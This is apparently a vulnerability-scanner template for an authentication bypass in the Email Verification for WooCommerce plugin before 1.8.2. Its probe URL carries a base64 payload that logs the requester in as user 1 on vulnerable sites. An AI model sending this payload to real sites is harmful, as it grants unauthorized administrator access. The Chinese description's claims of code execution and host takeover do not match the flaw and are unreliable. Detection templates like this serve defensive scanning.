id: wp-woocommerce-email-verification

info:
  name: Email Verification for WooCommerce < 1.8.2 - Loose Comparison to - 认证绕过漏洞
  author: random_robbie,daffianfo
  severity: critical
  description: |
    该模板用于检测 Email Verification for WooCommerce < 1.8.2 - Loose Comparison to - 认证绕过漏洞。该类漏洞通常与危险接口暴露、命令参数拼接、模板解析、反序列化或组件缺陷有关，攻击者可能让服务端执行非预期代码。模板会向 `/my-account/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=`、`/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可在目标服务权限范围内执行命令或代码，进而接管应用所在主机。
    - 成功利用后可能泄露配置、密钥和业务数据，并为横向移动、持久化控制或破坏业务提供入口。
  remediation: |
    - 升级受影响产品或组件到厂商修复版本，移除存在已知缺陷的依赖。
    - 限制高危接口的公网访问，增加认证、授权和来源校验，并避免将用户输入传入命令执行、模板解析或反序列化流程。
    - 排查异常进程、计划任务、WebShell、外联连接和新增账号，必要时轮换凭据并重建受影响环境。
  reference:
    - https://wpvulndb.com/vulnerabilities/10318
    - https://wpscan.com/vulnerability/0c93832c-83db-4053-8a11-70de966bb3a8
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-288
  metadata:
    max-request: 2
  tags: woocommerce,wordpress,wpscan,wp-plugin,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/my-account/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0="
      - "{{BaseURL}}/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0="

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: regex
        part: header
        regex:
          - "wordpress_logged_in_[a-z0-9]{32}"

      - type: word
        part: body
        words:
          - "Your account has been activated!"
          - "From your account dashboard you can view your"
        condition: and

      - type: status
        status:
          - 200
